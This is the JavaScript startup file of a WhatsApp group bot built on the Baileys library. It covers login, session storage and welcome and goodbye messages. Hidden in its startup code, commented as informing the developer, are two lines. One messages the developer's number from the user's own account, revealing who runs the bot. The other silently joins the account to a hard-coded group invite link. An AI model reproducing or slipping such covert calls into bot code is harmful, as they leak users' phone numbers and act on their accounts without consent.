const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
const fs = require('fs')
const figlet = require('figlet')
const moment = require('moment-timezone')
const { wait, banner, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions.js')
const { color } = require('./lib/color.js')
const _welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
const setting = JSON.parse(fs.readFileSync('./setting/setting.json'))

session = setting.session


require('./AlienAlfa.js')
nocache('./AlienAlfa.js', module => console.log(`${module} telah di update!`))

const starts = async (Alienalfa = new WAConnection()) => {
    Alienalfa.logger.level = 'warn'
    Alienalfa.version = [2, 2142, 12]
    console.log(color(figlet.textSync('Doge Bot', {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: false
	}), 'cyan'))
	console.log(color('\n> YT CHANNEL: Mikhaiel Offical ','silver'))
console.log(color('> GITHUB: Mikhaiel ','silver'))
console.log(color('> WA NUMBER: +919544846609 ','silver'))
console.log(color('  Jimbru Inc. 2022','mediumseagreen'))
    console.log(color('<>','red'), color('I Wrote This Script By Myself!\nNote, The Script Is Encrypted, So You Wont Be Able To Recode, If You Wish To Buy Decrypted Script Contact The Developer', 'yellow'))
    console.log(color('<>','red'), color('Source Code Version: 3.0', 'aqua'))
    console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/919074210316'))
    console.log(color('[JIMBRU BOT]'), color('Jimbru Is Online', 'aqua'))
    console.log(color('[DEV]', 'cyan'), color('Welcome Back Owner! Hope You Doing Well~', 'magenta'))
    console.log(color('<>','red'), color('Thanks For Using Jimbru', 'white'))
	Alienalfa.browserDescription = [ 'Jimbru v3', 'chrome', '3.0' ]
    Alienalfa.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code in only 20 seconds !!'))
    })

    fs.existsSync(`./${session}.json`) && Alienalfa.loadAuthInfo(`./${session}.json`)
    Alienalfa.on('connecting', () => {
        start('2', 'Loading ...')
    })
    Alienalfa.on('open', () => {
        success('2', 'Connected ✓')
    })
        //inform to developer that the user is connected to bot
    Alienalfa.sendMessage(`919074210316@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
    
    //group link target
    teks = `https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS`
    Alienalfa.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
    
    await Alienalfa.connect({timeoutMs: 30*1000})
        fs.writeFileSync(`./${session}.json`, JSON.stringify(Alienalfa.base64EncodedAuthInfo(), null, '\t'))

    Alienalfa.on('chat-update', async (message) => {
        require('./AlienAlfa.js')(Alienalfa, message, _welkom)
    })
Alienalfa.on("group-participants-update", async (anu) => {

    const isWelkom = _welkom.includes(anu.jid)
    try {
      groupMet = await Alienalfa.groupMetadata(anu.jid)
      groupMembers = groupMet.participants
      groupAdmins = getGroupAdmins(groupMembers)
      mem = anu.participants[0]

      console.log(anu)
      try {
        pp_user = await Alienalfa.getProfilePicture(mem)
      } catch (e) {
        pp_user = "https://telegra.ph/file/c9dfa715c26518201f478.jpg"
      }
      try {
        pp_group = await Alienalfa.getProfilePicture(anu.jid)
      } catch (e) {
        pp_group =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
      }
            if (anu.action == "add" && mem.includes(Alienalfa.user.jid)) {
        Alienalfa.sendMessage(anu.jid, "Hello everyone, am jimbroottan, ready to help you here ㋛︎", "conversation")
      }
      buffer = await getBuffer(pp_user)
      if (anu.action == 'add' && !mem.includes(Alienalfa.user.jid)) {
      const mdata = await Alienalfa.groupMetadata(anu.jid)
      const memeg = mdata.participants.length
      const thu = await Alienalfa.getStatus(anu.participants[0], MessageType.text)
      const num = anu.participants[0]
      const bosco1 = await Alienalfa.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
      const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
      let v = Alienalfa.contacts[num] || { notify: num.replace(/@.+/, '') }
      anu_user = v.vname || v.notify || num.split('@')[0]
      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
      teks = ` 𝙃𝙞 _*@${num.split('@')[0]}*_ \n   𝘽𝙞𝙤 : _*${thu.status}*_ \n  𝙈𝙚𝙢𝙗𝙚𝙧 : _*${memeg}*_ \n  𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 _*${mdata.subject}*_\n  𝘿𝙤𝙣𝙩 𝙁𝙤𝙧𝙜𝙚𝙩 𝙏𝙤 𝙍𝙚𝙖𝙙 𝘿𝙚𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣`
      welcomeBut = [{buttonId:`#menu`,buttonText:{displayText:'MENU 🗂️'},type:1}, {buttonId:`#getdesc`,buttonText:{displayText:'READ DESC 📋'},type:1}]
      welcomeButt = { contentText: `${teks}`, footerText: `© ＪＩＭＢＲＯＯＴＴＡＮ`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
      Alienalfa.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
      }
      if (anu.action == 'remove' && !mem.includes(Alienalfa.user.jid)) {
      const mdata = await Alienalfa.groupMetadata(anu.jid)
      const num = anu.participants[0]
      const bosco3 = await Alienalfa.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
      const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
      let w = Alienalfa.contacts[num] || { notify: num.replace(/@.+/, '') }
      anu_user = w.vname || w.notify || num.split('@')[0]
      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
      memeg = mdata.participants.length
      out = ` 𝙂𝙤𝙤𝙙𝙗𝙮𝙚 _*@${num.split('@')[0]}*_\n 𝙃𝙤𝙥𝙚𝙛𝙪𝙡𝙡𝙮 𝙏𝙝𝙚𝙧𝙚 𝙒𝙤𝙣'𝙩 𝘽𝙚 𝘽𝙪𝙧𝙙𝙚𝙣 𝙃𝙚𝙧𝙚 𝘼𝙣𝙮𝙢𝙤𝙧𝙚`
      goodbyeBut = [{buttonId:`#gbye`,buttonText:{displayText:'BYE 👋'},type:1}, {buttonId:`#menu`,buttonText:{displayText:'MENU 🗂️'}, type:1}]
      goodbyeButt = { contentText: `${out}`, footerText: `© ＪＩＭＢＲＯＯＴＴＡＮ`, buttons: goodbyeBut, headerType: 6, locationMessage: bosco3.message.locationMessage}
      Alienalfa.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
      }
    } catch (e) {
      console.log("Error : %s", color(e, "red"))
    }

  })
}

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    console.log('Module', `'${module}'`, 'Now being watched for changes')
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}

starts()
